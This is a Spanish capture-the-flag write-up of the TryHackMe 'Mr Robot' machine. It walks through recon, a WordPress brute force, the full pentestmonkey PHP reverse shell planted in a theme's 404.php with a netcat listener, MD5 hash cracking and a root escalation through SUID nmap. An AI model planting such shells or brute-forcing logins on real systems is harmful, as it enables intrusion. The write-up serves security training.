# Writeup - Mr Robot (TryHackMe)

**Máquina:** Mr Robot  
**Plataforma:** TryHackMe  
**Sistema:** Linux  
**IP:** 10.10.0.67  
**Objetivo:** Obtener key-1-of-3, key-2-of-3 y key-3-of-3

---

## 1. Reconocimiento

### Escaneo de puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.0.67 -oG all_ports.txt
```

**Resultado:**
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
443/tcp open https
```

```bash
nmap -p22,80,443 -sCV -vvv 10.10.0.67 -oN tcp_scan.txt
```

**Resultado:**
- `22/tcp` - OpenSSH
- `80/tcp` - Apache httpd
- `443/tcp` - Apache httpd

### Enumeración web

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -ic -v -u http://10.10.0.67/FUZZ -e .html,.php,.txt
```

**Resultados relevantes:**
```
/robots.txt            (Status: 200)
/robots                (Status: 200)
/wp-login              (Status: 200)
/wp-admin              (Status: 302)
/wp-content            (Status: 301)
/license               (Status: 200)
/readme                (Status: 200)
/0                     (Status: 200)
```

### robots.txt

```bash
curl http://10.10.0.67/robots.txt
```

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Descargamos los archivos:

```bash
wget http://10.10.0.67/key-1-of-3.txt
wget http://10.10.0.67/fsocity.dic
```

**key-1-of-3.txt:**
```
<REDACTED>
```

---

## 2. WordPress - Acceso inicial

El sitio corre WordPress. En la página `/license` encontramos un string codificado en Base64 al final:

```
ZWxsaW90OkVSMjgtMDY1Mgo=
```

```bash
echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
elliot:ER28-0652
```

**Credenciales WordPress:** `elliot:ER28-0652`

También se puede obtener por fuerza bruta con WPScan usando `fsocity.dic`. El diccionario tiene ~858k líneas con duplicados, lo limpiamos primero:

```bash
sort fsocity.dic | uniq > wordlist.txt
```

Esto reduce de 858k a ~11k líneas, acelerando el ataque.

Ataque de fuerza bruta al usuario y contraseña con el diccionario limpio:

```bash
wpscan --password-attack wp-login -t 50 -U wordlist.txt -P wordlist.txt --url http://10.10.0.67/wp-login.php
```

### Reverse shell

Dentro del panel de administración de WordPress, vamos a **Apariencia → Editor**. Seleccionamos el tema activo y editamos `404.php`. Reemplazamos todo el contenido con el reverse shell de pentestmonkey:

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.1.1';   // CAMBIAR POR TU IP
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	if ($pid) {
		exit(0);
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}
	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");
umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}
?>
```

Guardamos los cambios. En nuestra Kali iniciamos un listener:

```bash
nc -lvnp 4444
```

Ejecutamos el shell navegando a una URL que no exista para que se ejecute el template 404:

```bash
curl http://10.10.0.67/404.php
```

Recibimos la conexión reversa como `daemon`.

Tratamiento de la TTY:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 3. Escalada de privilegios (daemon → robot)

Una vez con acceso al sistema, exploramos `/home/`:

```bash
ls -la /home/robot/
```

```
total 8
drwxr-xr-x 2 root root 4096 Nov 13  2015 .
drwxr-xr-x 3 root root 4096 Nov 13  2015 ..
-r-------- 1 robot robot  33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot  39 Nov 13  2015 password.raw-md5
```

```bash
cat /home/robot/password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

El hash es MD5. Lo craqueamos:

```bash
echo "c3fcd3d76192e4007dfb496cca67e13b" > hash.txt
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**Contraseña:** `abcdefghijklmnopqrstuvwxyz`

Cambiamos al usuario `robot`:

```bash
su robot
```

### key-2-of-3.txt

```bash
robot@linux:~$ cat /home/robot/key-2-of-3.txt
<REDACTED>
```

---

## 4. Escalada a root

Buscamos binarios con SUID bit:

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Resultado relevante:**
```
/usr/local/bin/nmap
```

`nmap` en versión 3.81 tiene modo interactivo. Consultamos GTFObins para la técnica:

```bash
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help

nmap> !sh
```

```bash
# whoami
root
```

### key-3-of-3.txt

```bash
cat /root/key-3-of-3.txt
<REDACTED>
```

---

## Resumen de flags

| Flag | Hash | Ubicación |
|------|------|-----------|
| **key-1-of-3** | `<REDACTED>` | `/robots.txt` |
| **key-2-of-3** | `<REDACTED>` | `/home/robot/` |
| **key-3-of-3** | `<REDACTED>` | `/root/` |

---

## Timeline

1. Reconocimiento con nmap → puertos 22 (SSH), 80 (HTTP) y 443 (HTTPS)
2. Fuzzing con ffuf descubre `/robots.txt`, `/wp-login`, `/license`
3. `robots.txt` revela `fsocity.dic` y `key-1-of-3.txt`
4. `/license` contiene credenciales en Base64 → `elliot:ER28-0652`
5. Acceso a WordPress como admin → editor de temas
6. Reverse shell editando `404.php` → shell como `daemon`
7. Enumeración → `/home/robot/password.raw-md5` con hash MD5
8. Craqueo del hash → `robot:abcdefghijklmnopqrstuvwxyz`
9. `su robot` → lectura de `key-2-of-3.txt`
10. SUID `nmap --interactive` → shell como root
11. `/root/key-3-of-3.txt`

---

## Lecciones aprendidas

- Revisar siempre `robots.txt` — puede exponer archivos sensibles
- El Base64 no es cifrado, no almacenar credenciales así
- Los hash MD5 se craquean instantáneamente con diccionarios
- Binarios con SUID bit como `nmap` permiten escalar a root si son versiones antiguas
- Herramientas como GTFObins son esenciales para identificar vectores de escalada


